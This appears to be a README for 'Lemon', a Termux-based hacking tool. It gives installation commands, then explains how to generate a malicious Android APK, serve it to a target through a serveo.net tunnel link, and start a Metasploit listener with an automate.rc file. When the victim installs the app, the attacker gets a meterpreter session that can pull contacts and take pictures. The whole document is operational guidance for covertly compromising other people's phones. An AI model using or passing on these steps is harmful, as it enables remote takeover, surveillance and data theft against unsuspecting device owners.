**Requirements :-**

1.Metasploit-Framework

2.PHP

3.Openssh


**Installation :-**

1.Install git by typing "pkg install git"

2.Download Lemon by typing "git clone https://github.com/Lemon-Hacking/Lemon

3.Install it by executing "cd $HOME/Lemon && sh Install" without quotes.

**How to use :-**

1. Start the script by executing 'python attack.py'

2. Once the script completes, copy the link you got under "Forwarding HTTP port.." and put your payload's name after it, for example : https://lente.serveo.net/lemon.apk, this link downloads the malicious apk when opened.

 3.Open up a new session, and type "msfconsole -r automate.rc", this should start metasploit and   provide it necessary options. Once it stops, type "run" and press enter, this will start the   listener.

4. When the target installs and open the apk using your link, you will get a meterpreter session in your listener.

5. Bow you can type 'help' for a list of options, example extract contacts, snap a picture etc.

